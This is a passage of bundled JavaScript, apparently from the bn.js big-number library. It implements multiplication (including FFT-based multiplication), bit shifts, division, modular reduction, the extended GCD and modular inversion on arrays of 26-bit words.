          lo = lo + Math.imul(al8, bl2) | 0;
          mid = mid + Math.imul(al8, bh2) | 0;
          mid = mid + Math.imul(ah8, bl2) | 0;
          hi = hi + Math.imul(ah8, bh2) | 0;
          lo = lo + Math.imul(al7, bl3) | 0;
          mid = mid + Math.imul(al7, bh3) | 0;
          mid = mid + Math.imul(ah7, bl3) | 0;
          hi = hi + Math.imul(ah7, bh3) | 0;
          lo = lo + Math.imul(al6, bl4) | 0;
          mid = mid + Math.imul(al6, bh4) | 0;
          mid = mid + Math.imul(ah6, bl4) | 0;
          hi = hi + Math.imul(ah6, bh4) | 0;
          lo = lo + Math.imul(al5, bl5) | 0;
          mid = mid + Math.imul(al5, bh5) | 0;
          mid = mid + Math.imul(ah5, bl5) | 0;
          hi = hi + Math.imul(ah5, bh5) | 0;
          lo = lo + Math.imul(al4, bl6) | 0;
          mid = mid + Math.imul(al4, bh6) | 0;
          mid = mid + Math.imul(ah4, bl6) | 0;
          hi = hi + Math.imul(ah4, bh6) | 0;
          lo = lo + Math.imul(al3, bl7) | 0;
          mid = mid + Math.imul(al3, bh7) | 0;
          mid = mid + Math.imul(ah3, bl7) | 0;
          hi = hi + Math.imul(ah3, bh7) | 0;
          lo = lo + Math.imul(al2, bl8) | 0;
          mid = mid + Math.imul(al2, bh8) | 0;
          mid = mid + Math.imul(ah2, bl8) | 0;
          hi = hi + Math.imul(ah2, bh8) | 0;
          lo = lo + Math.imul(al1, bl9) | 0;
          mid = mid + Math.imul(al1, bh9) | 0;
          mid = mid + Math.imul(ah1, bl9) | 0;
          hi = hi + Math.imul(ah1, bh9) | 0;
          var w10 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w10 >>> 26) | 0;
          w10 &= 0x3ffffff;
          lo = Math.imul(al9, bl2);
          mid = Math.imul(al9, bh2);
          mid = mid + Math.imul(ah9, bl2) | 0;
          hi = Math.imul(ah9, bh2);
          lo = lo + Math.imul(al8, bl3) | 0;
          mid = mid + Math.imul(al8, bh3) | 0;
          mid = mid + Math.imul(ah8, bl3) | 0;
          hi = hi + Math.imul(ah8, bh3) | 0;
          lo = lo + Math.imul(al7, bl4) | 0;
          mid = mid + Math.imul(al7, bh4) | 0;
          mid = mid + Math.imul(ah7, bl4) | 0;
          hi = hi + Math.imul(ah7, bh4) | 0;
          lo = lo + Math.imul(al6, bl5) | 0;
          mid = mid + Math.imul(al6, bh5) | 0;
          mid = mid + Math.imul(ah6, bl5) | 0;
          hi = hi + Math.imul(ah6, bh5) | 0;
          lo = lo + Math.imul(al5, bl6) | 0;
          mid = mid + Math.imul(al5, bh6) | 0;
          mid = mid + Math.imul(ah5, bl6) | 0;
          hi = hi + Math.imul(ah5, bh6) | 0;
          lo = lo + Math.imul(al4, bl7) | 0;
          mid = mid + Math.imul(al4, bh7) | 0;
          mid = mid + Math.imul(ah4, bl7) | 0;
          hi = hi + Math.imul(ah4, bh7) | 0;
          lo = lo + Math.imul(al3, bl8) | 0;
          mid = mid + Math.imul(al3, bh8) | 0;
          mid = mid + Math.imul(ah3, bl8) | 0;
          hi = hi + Math.imul(ah3, bh8) | 0;
          lo = lo + Math.imul(al2, bl9) | 0;
          mid = mid + Math.imul(al2, bh9) | 0;
          mid = mid + Math.imul(ah2, bl9) | 0;
          hi = hi + Math.imul(ah2, bh9) | 0;
          var w11 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w11 >>> 26) | 0;
          w11 &= 0x3ffffff;
          lo = Math.imul(al9, bl3);
          mid = Math.imul(al9, bh3);
          mid = mid + Math.imul(ah9, bl3) | 0;
          hi = Math.imul(ah9, bh3);
          lo = lo + Math.imul(al8, bl4) | 0;
          mid = mid + Math.imul(al8, bh4) | 0;
          mid = mid + Math.imul(ah8, bl4) | 0;
          hi = hi + Math.imul(ah8, bh4) | 0;
          lo = lo + Math.imul(al7, bl5) | 0;
          mid = mid + Math.imul(al7, bh5) | 0;
          mid = mid + Math.imul(ah7, bl5) | 0;
          hi = hi + Math.imul(ah7, bh5) | 0;
          lo = lo + Math.imul(al6, bl6) | 0;
          mid = mid + Math.imul(al6, bh6) | 0;
          mid = mid + Math.imul(ah6, bl6) | 0;
          hi = hi + Math.imul(ah6, bh6) | 0;
          lo = lo + Math.imul(al5, bl7) | 0;
          mid = mid + Math.imul(al5, bh7) | 0;
          mid = mid + Math.imul(ah5, bl7) | 0;
          hi = hi + Math.imul(ah5, bh7) | 0;
          lo = lo + Math.imul(al4, bl8) | 0;
          mid = mid + Math.imul(al4, bh8) | 0;
          mid = mid + Math.imul(ah4, bl8) | 0;
          hi = hi + Math.imul(ah4, bh8) | 0;
          lo = lo + Math.imul(al3, bl9) | 0;
          mid = mid + Math.imul(al3, bh9) | 0;
          mid = mid + Math.imul(ah3, bl9) | 0;
          hi = hi + Math.imul(ah3, bh9) | 0;
          var w12 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w12 >>> 26) | 0;
          w12 &= 0x3ffffff;
          lo = Math.imul(al9, bl4);
          mid = Math.imul(al9, bh4);
          mid = mid + Math.imul(ah9, bl4) | 0;
          hi = Math.imul(ah9, bh4);
          lo = lo + Math.imul(al8, bl5) | 0;
          mid = mid + Math.imul(al8, bh5) | 0;
          mid = mid + Math.imul(ah8, bl5) | 0;
          hi = hi + Math.imul(ah8, bh5) | 0;
          lo = lo + Math.imul(al7, bl6) | 0;
          mid = mid + Math.imul(al7, bh6) | 0;
          mid = mid + Math.imul(ah7, bl6) | 0;
          hi = hi + Math.imul(ah7, bh6) | 0;
          lo = lo + Math.imul(al6, bl7) | 0;
          mid = mid + Math.imul(al6, bh7) | 0;
          mid = mid + Math.imul(ah6, bl7) | 0;
          hi = hi + Math.imul(ah6, bh7) | 0;
          lo = lo + Math.imul(al5, bl8) | 0;
          mid = mid + Math.imul(al5, bh8) | 0;
          mid = mid + Math.imul(ah5, bl8) | 0;
          hi = hi + Math.imul(ah5, bh8) | 0;
          lo = lo + Math.imul(al4, bl9) | 0;
          mid = mid + Math.imul(al4, bh9) | 0;
          mid = mid + Math.imul(ah4, bl9) | 0;
          hi = hi + Math.imul(ah4, bh9) | 0;
          var w13 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w13 >>> 26) | 0;
          w13 &= 0x3ffffff;
          lo = Math.imul(al9, bl5);
          mid = Math.imul(al9, bh5);
          mid = mid + Math.imul(ah9, bl5) | 0;
          hi = Math.imul(ah9, bh5);
          lo = lo + Math.imul(al8, bl6) | 0;
          mid = mid + Math.imul(al8, bh6) | 0;
          mid = mid + Math.imul(ah8, bl6) | 0;
          hi = hi + Math.imul(ah8, bh6) | 0;
          lo = lo + Math.imul(al7, bl7) | 0;
          mid = mid + Math.imul(al7, bh7) | 0;
          mid = mid + Math.imul(ah7, bl7) | 0;
          hi = hi + Math.imul(ah7, bh7) | 0;
          lo = lo + Math.imul(al6, bl8) | 0;
          mid = mid + Math.imul(al6, bh8) | 0;
          mid = mid + Math.imul(ah6, bl8) | 0;
          hi = hi + Math.imul(ah6, bh8) | 0;
          lo = lo + Math.imul(al5, bl9) | 0;
          mid = mid + Math.imul(al5, bh9) | 0;
          mid = mid + Math.imul(ah5, bl9) | 0;
          hi = hi + Math.imul(ah5, bh9) | 0;
          var w14 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w14 >>> 26) | 0;
          w14 &= 0x3ffffff;
          lo = Math.imul(al9, bl6);
          mid = Math.imul(al9, bh6);
          mid = mid + Math.imul(ah9, bl6) | 0;
          hi = Math.imul(ah9, bh6);
          lo = lo + Math.imul(al8, bl7) | 0;
          mid = mid + Math.imul(al8, bh7) | 0;
          mid = mid + Math.imul(ah8, bl7) | 0;
          hi = hi + Math.imul(ah8, bh7) | 0;
          lo = lo + Math.imul(al7, bl8) | 0;
          mid = mid + Math.imul(al7, bh8) | 0;
          mid = mid + Math.imul(ah7, bl8) | 0;
          hi = hi + Math.imul(ah7, bh8) | 0;
          lo = lo + Math.imul(al6, bl9) | 0;
          mid = mid + Math.imul(al6, bh9) | 0;
          mid = mid + Math.imul(ah6, bl9) | 0;
          hi = hi + Math.imul(ah6, bh9) | 0;
          var w15 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w15 >>> 26) | 0;
          w15 &= 0x3ffffff;
          lo = Math.imul(al9, bl7);
          mid = Math.imul(al9, bh7);
          mid = mid + Math.imul(ah9, bl7) | 0;
          hi = Math.imul(ah9, bh7);
          lo = lo + Math.imul(al8, bl8) | 0;
          mid = mid + Math.imul(al8, bh8) | 0;
          mid = mid + Math.imul(ah8, bl8) | 0;
          hi = hi + Math.imul(ah8, bh8) | 0;
          lo = lo + Math.imul(al7, bl9) | 0;
          mid = mid + Math.imul(al7, bh9) | 0;
          mid = mid + Math.imul(ah7, bl9) | 0;
          hi = hi + Math.imul(ah7, bh9) | 0;
          var w16 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w16 >>> 26) | 0;
          w16 &= 0x3ffffff;
          lo = Math.imul(al9, bl8);
          mid = Math.imul(al9, bh8);
          mid = mid + Math.imul(ah9, bl8) | 0;
          hi = Math.imul(ah9, bh8);
          lo = lo + Math.imul(al8, bl9) | 0;
          mid = mid + Math.imul(al8, bh9) | 0;
          mid = mid + Math.imul(ah8, bl9) | 0;
          hi = hi + Math.imul(ah8, bh9) | 0;
          var w17 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w17 >>> 26) | 0;
          w17 &= 0x3ffffff;
          lo = Math.imul(al9, bl9);
          mid = Math.imul(al9, bh9);
          mid = mid + Math.imul(ah9, bl9) | 0;
          hi = Math.imul(ah9, bh9);
          var w18 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w18 >>> 26) | 0;
          w18 &= 0x3ffffff;
          o[0] = w0;
          o[1] = w1;
          o[2] = w2;
          o[3] = w3;
          o[4] = w4;
          o[5] = w5;
          o[6] = w6;
          o[7] = w7;
          o[8] = w8;
          o[9] = w9;
          o[10] = w10;
          o[11] = w11;
          o[12] = w12;
          o[13] = w13;
          o[14] = w14;
          o[15] = w15;
          o[16] = w16;
          o[17] = w17;
          o[18] = w18;
          if (c !== 0) {
            o[19] = c;
            out.length++;
          }
          return out;
        };
        if (!Math.imul) {
          comb10MulTo = smallMulTo;
        }
        function bigMulTo(self, num, out) {
          out.negative = num.negative ^ self.negative;
          out.length = self.length + num.length;
          var carry = 0;
          var hncarry = 0;
          for (var k = 0; k < out.length - 1; k++) {
            var ncarry = hncarry;
            hncarry = 0;
            var rword = carry & 0x3ffffff;
            var maxJ = Math.min(k, num.length - 1);
            for (var j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {
              var i = k - j;
              var a = self.words[i] | 0;
              var b = num.words[j] | 0;
              var r = a * b;
              var lo = r & 0x3ffffff;
              ncarry = ncarry + (r / 0x4000000 | 0) | 0;
              lo = lo + rword | 0;
              rword = lo & 0x3ffffff;
              ncarry = ncarry + (lo >>> 26) | 0;
              hncarry += ncarry >>> 26;
              ncarry &= 0x3ffffff;
            }
            out.words[k] = rword;
            carry = ncarry;
            ncarry = hncarry;
          }
          if (carry !== 0) {
            out.words[k] = carry;
          } else {
            out.length--;
          }
          return out._strip();
        }
        function jumboMulTo(self, num, out) {
          return bigMulTo(self, num, out);
        }
        BN.prototype.mulTo = function mulTo(num, out) {
          var res;
          var len = this.length + num.length;
          if (this.length === 10 && num.length === 10) {
            res = comb10MulTo(this, num, out);
          } else if (len < 63) {
            res = smallMulTo(this, num, out);
          } else if (len < 1024) {
            res = bigMulTo(this, num, out);
          } else {
            res = jumboMulTo(this, num, out);
          }
          return res;
        };
        function FFTM(x, y) {
          this.x = x;
          this.y = y;
        }
        FFTM.prototype.makeRBT = function makeRBT(N) {
          var t = new Array(N);
          var l = BN.prototype._countBits(N) - 1;
          for (var i = 0; i < N; i++) {
            t[i] = this.revBin(i, l, N);
          }
          return t;
        };
        FFTM.prototype.revBin = function revBin(x, l, N) {
          if (x === 0 || x === N - 1) return x;
          var rb = 0;
          for (var i = 0; i < l; i++) {
            rb |= (x & 1) << l - i - 1;
            x >>= 1;
          }
          return rb;
        };
        FFTM.prototype.permute = function permute(rbt, rws, iws, rtws, itws, N) {
          for (var i = 0; i < N; i++) {
            rtws[i] = rws[rbt[i]];
            itws[i] = iws[rbt[i]];
          }
        };
        FFTM.prototype.transform = function transform(rws, iws, rtws, itws, N, rbt) {
          this.permute(rbt, rws, iws, rtws, itws, N);
          for (var s = 1; s < N; s <<= 1) {
            var l = s << 1;
            var rtwdf = Math.cos(2 * Math.PI / l);
            var itwdf = Math.sin(2 * Math.PI / l);
            for (var p = 0; p < N; p += l) {
              var rtwdf_ = rtwdf;
              var itwdf_ = itwdf;
              for (var j = 0; j < s; j++) {
                var re = rtws[p + j];
                var ie = itws[p + j];
                var ro = rtws[p + j + s];
                var io = itws[p + j + s];
                var rx = rtwdf_ * ro - itwdf_ * io;
                io = rtwdf_ * io + itwdf_ * ro;
                ro = rx;
                rtws[p + j] = re + ro;
                itws[p + j] = ie + io;
                rtws[p + j + s] = re - ro;
                itws[p + j + s] = ie - io;
                if (j !== l) {
                  rx = rtwdf * rtwdf_ - itwdf * itwdf_;
                  itwdf_ = rtwdf * itwdf_ + itwdf * rtwdf_;
                  rtwdf_ = rx;
                }
              }
            }
          }
        };
        FFTM.prototype.guessLen13b = function guessLen13b(n, m) {
          var N = Math.max(m, n) | 1;
          var odd = N & 1;
          var i = 0;
          for (N = N / 2 | 0; N; N = N >>> 1) {
            i++;
          }
          return 1 << i + 1 + odd;
        };
        FFTM.prototype.conjugate = function conjugate(rws, iws, N) {
          if (N <= 1) return;
          for (var i = 0; i < N / 2; i++) {
            var t = rws[i];
            rws[i] = rws[N - i - 1];
            rws[N - i - 1] = t;
            t = iws[i];
            iws[i] = -iws[N - i - 1];
            iws[N - i - 1] = -t;
          }
        };
        FFTM.prototype.normalize13b = function normalize13b(ws, N) {
          var carry = 0;
          for (var i = 0; i < N / 2; i++) {
            var w = Math.round(ws[2 * i + 1] / N) * 0x2000 + Math.round(ws[2 * i] / N) + carry;
            ws[i] = w & 0x3ffffff;
            if (w < 0x4000000) {
              carry = 0;
            } else {
              carry = w / 0x4000000 | 0;
            }
          }
          return ws;
        };
        FFTM.prototype.convert13b = function convert13b(ws, len, rws, N) {
          var carry = 0;
          for (var i = 0; i < len; i++) {
            carry = carry + (ws[i] | 0);
            rws[2 * i] = carry & 0x1fff;
            carry = carry >>> 13;
            rws[2 * i + 1] = carry & 0x1fff;
            carry = carry >>> 13;
          }
          for (i = 2 * len; i < N; ++i) {
            rws[i] = 0;
          }
          assert(carry === 0);
          assert((carry & ~0x1fff) === 0);
        };
        FFTM.prototype.stub = function stub(N) {
          var ph = new Array(N);
          for (var i = 0; i < N; i++) {
            ph[i] = 0;
          }
          return ph;
        };
        FFTM.prototype.mulp = function mulp(x, y, out) {
          var N = 2 * this.guessLen13b(x.length, y.length);
          var rbt = this.makeRBT(N);
          var _ = this.stub(N);
          var rws = new Array(N);
          var rwst = new Array(N);
          var iwst = new Array(N);
          var nrws = new Array(N);
          var nrwst = new Array(N);
          var niwst = new Array(N);
          var rmws = out.words;
          rmws.length = N;
          this.convert13b(x.words, x.length, rws, N);
          this.convert13b(y.words, y.length, nrws, N);
          this.transform(rws, _, rwst, iwst, N, rbt);
          this.transform(nrws, _, nrwst, niwst, N, rbt);
          for (var i = 0; i < N; i++) {
            var rx = rwst[i] * nrwst[i] - iwst[i] * niwst[i];
            iwst[i] = rwst[i] * niwst[i] + iwst[i] * nrwst[i];
            rwst[i] = rx;
          }
          this.conjugate(rwst, iwst, N);
          this.transform(rwst, iwst, rmws, _, N, rbt);
          this.conjugate(rmws, _, N);
          this.normalize13b(rmws, N);
          out.negative = x.negative ^ y.negative;
          out.length = x.length + y.length;
          return out._strip();
        };
        BN.prototype.mul = function mul(num) {
          var out = new BN(null);
          out.words = new Array(this.length + num.length);
          return this.mulTo(num, out);
        };
        BN.prototype.mulf = function mulf(num) {
          var out = new BN(null);
          out.words = new Array(this.length + num.length);
          return jumboMulTo(this, num, out);
        };
        BN.prototype.imul = function imul(num) {
          return this.clone().mulTo(num, this);
        };
        BN.prototype.imuln = function imuln(num) {
          var isNegNum = num < 0;
          if (isNegNum) num = -num;
          assert(typeof num === 'number');
          assert(num < 0x4000000);
          var carry = 0;
          for (var i = 0; i < this.length; i++) {
            var w = (this.words[i] | 0) * num;
            var lo = (w & 0x3ffffff) + (carry & 0x3ffffff);
            carry >>= 26;
            carry += w / 0x4000000 | 0;
            carry += lo >>> 26;
            this.words[i] = lo & 0x3ffffff;
          }
          if (carry !== 0) {
            this.words[i] = carry;
            this.length++;
          }
          return isNegNum ? this.ineg() : this;
        };
        BN.prototype.muln = function muln(num) {
          return this.clone().imuln(num);
        };
        BN.prototype.sqr = function sqr() {
          return this.mul(this);
        };
        BN.prototype.isqr = function isqr() {
          return this.imul(this.clone());
        };
        BN.prototype.pow = function pow(num) {
          var w = toBitArray(num);
          if (w.length === 0) return new BN(1);
          var res = this;
          for (var i = 0; i < w.length; i++, res = res.sqr()) {
            if (w[i] !== 0) break;
          }
          if (++i < w.length) {
            for (var q = res.sqr(); i < w.length; i++, q = q.sqr()) {
              if (w[i] === 0) continue;
              res = res.mul(q);
            }
          }
          return res;
        };
        BN.prototype.iushln = function iushln(bits) {
          assert(typeof bits === 'number' && bits >= 0);
          var r = bits % 26;
          var s = (bits - r) / 26;
          var carryMask = 0x3ffffff >>> 26 - r << 26 - r;
          var i;
          if (r !== 0) {
            var carry = 0;
            for (i = 0; i < this.length; i++) {
              var newCarry = this.words[i] & carryMask;
              var c = (this.words[i] | 0) - newCarry << r;
              this.words[i] = c | carry;
              carry = newCarry >>> 26 - r;
            }
            if (carry) {
              this.words[i] = carry;
              this.length++;
            }
          }
          if (s !== 0) {
            for (i = this.length - 1; i >= 0; i--) {
              this.words[i + s] = this.words[i];
            }
            for (i = 0; i < s; i++) {
              this.words[i] = 0;
            }
            this.length += s;
          }
          return this._strip();
        };
        BN.prototype.ishln = function ishln(bits) {
          assert(this.negative === 0);
          return this.iushln(bits);
        };
        BN.prototype.iushrn = function iushrn(bits, hint, extended) {
          assert(typeof bits === 'number' && bits >= 0);
          var h;
          if (hint) {
            h = (hint - hint % 26) / 26;
          } else {
            h = 0;
          }
          var r = bits % 26;
          var s = Math.min((bits - r) / 26, this.length);
          var mask = 0x3ffffff ^ 0x3ffffff >>> r << r;
          var maskedWords = extended;
          h -= s;
          h = Math.max(0, h);
          if (maskedWords) {
            for (var i = 0; i < s; i++) {
              maskedWords.words[i] = this.words[i];
            }
            maskedWords.length = s;
          }
          if (s === 0) {} else if (this.length > s) {
            this.length -= s;
            for (i = 0; i < this.length; i++) {
              this.words[i] = this.words[i + s];
            }
          } else {
            this.words[0] = 0;
            this.length = 1;
          }
          var carry = 0;
          for (i = this.length - 1; i >= 0 && (carry !== 0 || i >= h); i--) {
            var word = this.words[i] | 0;
            this.words[i] = carry << 26 - r | word >>> r;
            carry = word & mask;
          }
          if (maskedWords && carry !== 0) {
            maskedWords.words[maskedWords.length++] = carry;
          }
          if (this.length === 0) {
            this.words[0] = 0;
            this.length = 1;
          }
          return this._strip();
        };
        BN.prototype.ishrn = function ishrn(bits, hint, extended) {
          assert(this.negative === 0);
          return this.iushrn(bits, hint, extended);
        };
        BN.prototype.shln = function shln(bits) {
          return this.clone().ishln(bits);
        };
        BN.prototype.ushln = function ushln(bits) {
          return this.clone().iushln(bits);
        };
        BN.prototype.shrn = function shrn(bits) {
          return this.clone().ishrn(bits);
        };
        BN.prototype.ushrn = function ushrn(bits) {
          return this.clone().iushrn(bits);
        };
        BN.prototype.testn = function testn(bit) {
          assert(typeof bit === 'number' && bit >= 0);
          var r = bit % 26;
          var s = (bit - r) / 26;
          var q = 1 << r;
          if (this.length <= s) return false;
          var w = this.words[s];
          return !!(w & q);
        };
        BN.prototype.imaskn = function imaskn(bits) {
          assert(typeof bits === 'number' && bits >= 0);
          var r = bits % 26;
          var s = (bits - r) / 26;
          assert(this.negative === 0, 'imaskn works only with positive numbers');
          if (this.length <= s) {
            return this;
          }
          if (r !== 0) {
            s++;
          }
          this.length = Math.min(s, this.length);
          if (r !== 0) {
            var mask = 0x3ffffff ^ 0x3ffffff >>> r << r;
            this.words[this.length - 1] &= mask;
          }
          return this._strip();
        };
        BN.prototype.maskn = function maskn(bits) {
          return this.clone().imaskn(bits);
        };
        BN.prototype.iaddn = function iaddn(num) {
          assert(typeof num === 'number');
          assert(num < 0x4000000);
          if (num < 0) return this.isubn(-num);
          if (this.negative !== 0) {
            if (this.length === 1 && (this.words[0] | 0) <= num) {
              this.words[0] = num - (this.words[0] | 0);
              this.negative = 0;
              return this;
            }
            this.negative = 0;
            this.isubn(num);
            this.negative = 1;
            return this;
          }
          return this._iaddn(num);
        };
        BN.prototype._iaddn = function _iaddn(num) {
          this.words[0] += num;
          for (var i = 0; i < this.length && this.words[i] >= 0x4000000; i++) {
            this.words[i] -= 0x4000000;
            if (i === this.length - 1) {
              this.words[i + 1] = 1;
            } else {
              this.words[i + 1]++;
            }
          }
          this.length = Math.max(this.length, i + 1);
          return this;
        };
        BN.prototype.isubn = function isubn(num) {
          assert(typeof num === 'number');
          assert(num < 0x4000000);
          if (num < 0) return this.iaddn(-num);
          if (this.negative !== 0) {
            this.negative = 0;
            this.iaddn(num);
            this.negative = 1;
            return this;
          }
          this.words[0] -= num;
          if (this.length === 1 && this.words[0] < 0) {
            this.words[0] = -this.words[0];
            this.negative = 1;
          } else {
            for (var i = 0; i < this.length && this.words[i] < 0; i++) {
              this.words[i] += 0x4000000;
              this.words[i + 1] -= 1;
            }
          }
          return this._strip();
        };
        BN.prototype.addn = function addn(num) {
          return this.clone().iaddn(num);
        };
        BN.prototype.subn = function subn(num) {
          return this.clone().isubn(num);
        };
        BN.prototype.iabs = function iabs() {
          this.negative = 0;
          return this;
        };
        BN.prototype.abs = function abs() {
          return this.clone().iabs();
        };
        BN.prototype._ishlnsubmul = function _ishlnsubmul(num, mul, shift) {
          var len = num.length + shift;
          var i;
          this._expand(len);
          var w;
          var carry = 0;
          for (i = 0; i < num.length; i++) {
            w = (this.words[i + shift] | 0) + carry;
            var right = (num.words[i] | 0) * mul;
            w -= right & 0x3ffffff;
            carry = (w >> 26) - (right / 0x4000000 | 0);
            this.words[i + shift] = w & 0x3ffffff;
          }
          for (; i < this.length - shift; i++) {
            w = (this.words[i + shift] | 0) + carry;
            carry = w >> 26;
            this.words[i + shift] = w & 0x3ffffff;
          }
          if (carry === 0) return this._strip();
          assert(carry === -1);
          carry = 0;
          for (i = 0; i < this.length; i++) {
            w = -(this.words[i] | 0) + carry;
            carry = w >> 26;
            this.words[i] = w & 0x3ffffff;
          }
          this.negative = 1;
          return this._strip();
        };
        BN.prototype._wordDiv = function _wordDiv(num, mode) {
          var shift = this.length - num.length;
          var a = this.clone();
          var b = num;
          var bhi = b.words[b.length - 1] | 0;
          var bhiBits = this._countBits(bhi);
          shift = 26 - bhiBits;
          if (shift !== 0) {
            b = b.ushln(shift);
            a.iushln(shift);
            bhi = b.words[b.length - 1] | 0;
          }
          var m = a.length - b.length;
          var q;
          if (mode !== 'mod') {
            q = new BN(null);
            q.length = m + 1;
            q.words = new Array(q.length);
            for (var i = 0; i < q.length; i++) {
              q.words[i] = 0;
            }
          }
          var diff = a.clone()._ishlnsubmul(b, 1, m);
          if (diff.negative === 0) {
            a = diff;
            if (q) {
              q.words[m] = 1;
            }
          }
          for (var j = m - 1; j >= 0; j--) {
            var qj = (a.words[b.length + j] | 0) * 0x4000000 + (a.words[b.length + j - 1] | 0);
            qj = Math.min(qj / bhi | 0, 0x3ffffff);
            a._ishlnsubmul(b, qj, j);
            while (a.negative !== 0) {
              qj--;
              a.negative = 0;
              a._ishlnsubmul(b, 1, j);
              if (!a.isZero()) {
                a.negative ^= 1;
              }
            }
            if (q) {
              q.words[j] = qj;
            }
          }
          if (q) {
            q._strip();
          }
          a._strip();
          if (mode !== 'div' && shift !== 0) {
            a.iushrn(shift);
          }
          return {
            div: q || null,
            mod: a
          };
        };
        BN.prototype.divmod = function divmod(num, mode, positive) {
          assert(!num.isZero());
          if (this.isZero()) {
            return {
              div: new BN(0),
              mod: new BN(0)
            };
          }
          var div, mod, res;
          if (this.negative !== 0 && num.negative === 0) {
            res = this.neg().divmod(num, mode);
            if (mode !== 'mod') {
              div = res.div.neg();
            }
            if (mode !== 'div') {
              mod = res.mod.neg();
              if (positive && mod.negative !== 0) {
                mod.iadd(num);
              }
            }
            return {
              div: div,
              mod: mod
            };
          }
          if (this.negative === 0 && num.negative !== 0) {
            res = this.divmod(num.neg(), mode);
            if (mode !== 'mod') {
              div = res.div.neg();
            }
            return {
              div: div,
              mod: res.mod
            };
          }
          if ((this.negative & num.negative) !== 0) {
            res = this.neg().divmod(num.neg(), mode);
            if (mode !== 'div') {
              mod = res.mod.neg();
              if (positive && mod.negative !== 0) {
                mod.isub(num);
              }
            }
            return {
              div: res.div,
              mod: mod
            };
          }
          if (num.length > this.length || this.cmp(num) < 0) {
            return {
              div: new BN(0),
              mod: this
            };
          }
          if (num.length === 1) {
            if (mode === 'div') {
              return {
                div: this.divn(num.words[0]),
                mod: null
              };
            }
            if (mode === 'mod') {
              return {
                div: null,
                mod: new BN(this.modrn(num.words[0]))
              };
            }
            return {
              div: this.divn(num.words[0]),
              mod: new BN(this.modrn(num.words[0]))
            };
          }
          return this._wordDiv(num, mode);
        };
        BN.prototype.div = function div(num) {
          return this.divmod(num, 'div', false).div;
        };
        BN.prototype.mod = function mod(num) {
          return this.divmod(num, 'mod', false).mod;
        };
        BN.prototype.umod = function umod(num) {
          return this.divmod(num, 'mod', true).mod;
        };
        BN.prototype.divRound = function divRound(num) {
          var dm = this.divmod(num);
          if (dm.mod.isZero()) return dm.div;
          var mod = dm.div.negative !== 0 ? dm.mod.isub(num) : dm.mod;
          var half = num.ushrn(1);
          var r2 = num.andln(1);
          var cmp = mod.cmp(half);
          if (cmp < 0 || r2 === 1 && cmp === 0) return dm.div;
          return dm.div.negative !== 0 ? dm.div.isubn(1) : dm.div.iaddn(1);
        };
        BN.prototype.modrn = function modrn(num) {
          var isNegNum = num < 0;
          if (isNegNum) num = -num;
          assert(num <= 0x3ffffff);
          var p = (1 << 26) % num;
          var acc = 0;
          for (var i = this.length - 1; i >= 0; i--) {
            acc = (p * acc + (this.words[i] | 0)) % num;
          }
          return isNegNum ? -acc : acc;
        };
        BN.prototype.modn = function modn(num) {
          return this.modrn(num);
        };
        BN.prototype.idivn = function idivn(num) {
          var isNegNum = num < 0;
          if (isNegNum) num = -num;
          assert(num <= 0x3ffffff);
          var carry = 0;
          for (var i = this.length - 1; i >= 0; i--) {
            var w = (this.words[i] | 0) + carry * 0x4000000;
            this.words[i] = w / num | 0;
            carry = w % num;
          }
          this._strip();
          return isNegNum ? this.ineg() : this;
        };
        BN.prototype.divn = function divn(num) {
          return this.clone().idivn(num);
        };
        BN.prototype.egcd = function egcd(p) {
          assert(p.negative === 0);
          assert(!p.isZero());
          var x = this;
          var y = p.clone();
          if (x.negative !== 0) {
            x = x.umod(p);
          } else {
            x = x.clone();
          }
          var A = new BN(1);
          var B = new BN(0);
          var C = new BN(0);
          var D = new BN(1);
          var g = 0;
          while (x.isEven() && y.isEven()) {
            x.iushrn(1);
            y.iushrn(1);
            ++g;
          }
          var yp = y.clone();
          var xp = x.clone();
          while (!x.isZero()) {
            for (var i = 0, im = 1; (x.words[0] & im) === 0 && i < 26; ++i, im <<= 1);
            if (i > 0) {
              x.iushrn(i);
              while (i-- > 0) {
                if (A.isOdd() || B.isOdd()) {
                  A.iadd(yp);
                  B.isub(xp);
                }
                A.iushrn(1);
                B.iushrn(1);
              }
            }
            for (var j = 0, jm = 1; (y.words[0] & jm) === 0 && j < 26; ++j, jm <<= 1);
            if (j > 0) {
              y.iushrn(j);
              while (j-- > 0) {
                if (C.isOdd() || D.isOdd()) {
                  C.iadd(yp);
                  D.isub(xp);
                }
                C.iushrn(1);
                D.iushrn(1);
              }
            }
            if (x.cmp(y) >= 0) {
              x.isub(y);
              A.isub(C);
              B.isub(D);
            } else {
              y.isub(x);
              C.isub(A);
              D.isub(B);
            }
          }
          return {
            a: C,
            b: D,
            gcd: y.iushln(g)
          };
        };
        BN.prototype._invmp = function _invmp(p) {
          assert(p.negative === 0);
          assert(!p.isZero());
          var a = this;
          var b = p.clone();
          if (a.negative !== 0) {
            a = a.umod(p);
          } else {
            a = a.clone();
          }
          var x1 = new BN(1);
          var x2 = new BN(0);
          var delta = b.clone();
          while (a.cmpn(1) > 0 && b.cmpn(1) > 0) {
            for (var i = 0, im = 1; (a.words[0] & im) === 0 && i < 26; ++i, im <<= 1);
            if (i > 0) {
              a.iushrn(i);
              while (i-- > 0) {
                if (x1.isOdd()) {
                  x1.iadd(delta);
                }
                x1.iushrn(1);
              }
            }
            for (var j = 0, jm = 1; (b.words[0] & jm) === 0 && j < 26; ++j, jm <<= 1);
            if (j > 0) {
              b.iushrn(j);
              while (j-- > 0) {
                if (x2.isOdd()) {
                  x2.iadd(delta);
                }
                x2.iushrn(1);
              }
            }
            if (a.cmp(b) >= 0) {
              a.isub(b);
              x1.isub(x2);
            } else {
              b.isub(a);
              x2.isub(x1);
            }
          }
